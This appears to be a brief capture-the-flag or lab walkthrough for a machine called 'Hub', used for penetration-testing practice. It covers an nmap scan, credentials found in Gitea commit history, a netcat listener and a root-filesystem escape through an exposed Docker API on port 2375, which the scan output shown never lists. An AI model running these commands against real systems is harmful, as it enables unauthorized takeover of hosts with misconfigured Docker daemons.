# 🐧 Hub

> Gitea + Docker API / Docker socket

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.124

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
3000/tcp open  http    Gitea
```
### Enumerating port 3000
Gitea installation. Found public repos and credentials via enumeration.
```shell
# Browse Gitea repos
# Found credentials in repository commit history
```
### Initial Access
Found Docker API exposed, used to escape container and access host.
```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Docker socket escape
docker -H tcp://192.168.182.124:2375 run -it -v /:/mnt alpine chroot /mnt sh
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
